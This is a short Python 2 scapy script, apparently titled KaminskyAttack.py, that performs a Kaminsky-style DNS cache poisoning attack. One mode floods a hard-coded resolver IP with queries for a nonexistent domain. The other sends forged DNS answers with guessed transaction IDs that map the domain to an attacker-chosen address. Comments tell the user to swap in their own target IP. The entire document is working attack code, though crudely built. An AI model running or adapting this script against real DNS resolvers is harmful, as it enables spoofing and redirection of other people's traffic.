import thread
import time
import random
import threading
import sys
from scapy.all import *

def keep_query():
	no_such_domain = 'no-such-domain.com'
	DNS_RCODE_NXDOMAIN = 3
	begin_time = time.time()
	while True:
		# change the dst to your ip
		dns_query = IP(dst='101.5.224.165')\
			/UDP(dport=53)\
			/DNS(
				id=random.randint(1, 5),
				rd=1,
				qd=DNSQR(qname=no_such_domain, qtype=2)
			)
		response = sr1(dns_query, timeout=1)
		if response and response.rcode != DNS_RCODE_NXDOMAIN:
			response.show()
			print 'attack success in {}s'.format(time.time() - begin_time)
			exit(0)
		time.sleep(0.5)

def keep_answer():
	while True:
		print('answer')
		dns_response = DNS(
				qr=1, # response packet
				rd=1,
				id=random.randint(1, 65535),
				qd=DNSQR(qname='no-such-domain.com', qtype=2),
				an=DNSRR(
						rrname='no-such-domain.com',
						type=1,
						rclass=1,
						ttl=512,
						rdata='192.168.0.1'
					)
			)
		# change the dst to your ip
		fake_response = IP(dst='101.5.224.165')/UDP(dport=8000)/dns_response
		send(fake_response)
		time.sleep(0.2)


# run python KaminskyAttack.py query to start query process
# remember to change the ip_address in the codes
if __name__ == '__main__':
	if len(sys.argv) < 2:
		print "please specify the mode"
		exit(0)
	if sys.argv[1] == 'query':
		keep_query()
	elif sys.argv[1] == 'answer':
		keep_answer()
	else:
		print "please choose one mode from 'query' and 'answer'"